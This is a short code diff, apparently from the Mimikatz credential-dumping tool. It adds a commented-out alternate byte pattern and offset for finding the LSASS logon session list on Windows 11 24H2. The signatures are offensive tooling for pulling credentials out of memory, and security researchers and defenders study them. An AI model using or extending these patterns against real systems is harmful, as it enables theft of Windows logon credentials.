@@ -21,6 +21,8 @@ BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b,
 BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
 BYTE PTRN_WN11_22H2_LogonSessionList[]	= {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};
 BYTE PTRN_WN11_24H2_LogonSessionList[] = { 0x45, 0x89, 0x34, 0x24, 0x8b, 0xfb, 0x45, 0x85, 0xc0, 0x0f, 0x84, 0xaa };
+// approach 2
+// BYTE PTRN_WN11_24H2_LogonSessionList[] = { 0x33, 0xd2, 0x48, 0xf7, 0xf1, 0x8b, 0xda, 0x48, 0x8d, 0x04, 0x5b, 0x48, 0xc1, 0xe0, 0x05 };
 
 KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
@@ -36,6 +38,8 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_2022,		{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
 	{KULL_M_WIN_BUILD_11_22H2,	{sizeof(PTRN_WN11_22H2_LogonSessionList), PTRN_WN11_22H2_LogonSessionList},	{0, NULL}, {27,  -4}},
 	{KULL_M_WIN_BUILD_11_24H2,	{sizeof(PTRN_WN11_24H2_LogonSessionList), PTRN_WN11_24H2_LogonSessionList},	{0, NULL}, {34,  -16}},
+	// approach 2
+	// {KULL_M_WIN_BUILD_11_24H2,	{sizeof(PTRN_WN11_24H2_LogonSessionList), PTRN_WN11_24H2_LogonSessionList},	{0, NULL}, {58,  -4}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WN51_LogonSessionList[]	= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
